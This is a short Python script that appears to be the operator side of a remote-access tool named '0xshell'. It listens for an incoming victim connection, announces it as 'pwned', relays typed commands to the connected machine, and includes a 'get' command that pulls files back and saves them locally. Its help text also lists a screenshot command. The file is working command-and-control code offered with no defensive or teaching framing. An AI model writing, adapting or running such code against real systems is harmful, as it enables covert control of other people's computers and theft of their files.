from socket import * # type: ignore

ip = "localhost"
port = input("Server port:")
port = int(port)

listener = socket(AF_INET,SOCK_STREAM)
listener.bind((ip,port))

listener.listen(2)
client , addr = listener.accept()
print(f"{str(addr)} pwned ;)\n")

while True:
    try:
        receiver = client.recv(1024).decode()
        print(receiver)
        Oxshell = input("0x>")
        if Oxshell=="help":
            print("""
            command    function
            -------    --------
            exit       kills the 0xshell session
            screenshot takes a screenshot
            """)
        elif Oxshell=="exit":
            client.send(Oxshell.encode())
            exit()
        elif Oxshell== "" or Oxshell is None:
            print("lol error")
        elif Oxshell[:3]=="get":
            client.send(Oxshell.encode())
            filedata = b""
            while True:
                footer = client.recv(1024)
                if footer == b"ENDBYTES":
                    print("done ;)")
                    break
                filedata += footer
            filename = input("output filename:")
            downedfile = open(filename,"wb")
            downedfile.write(filedata)
            downedfile.close()
        else:
            client.send(Oxshell.encode())
    except error:
        pass


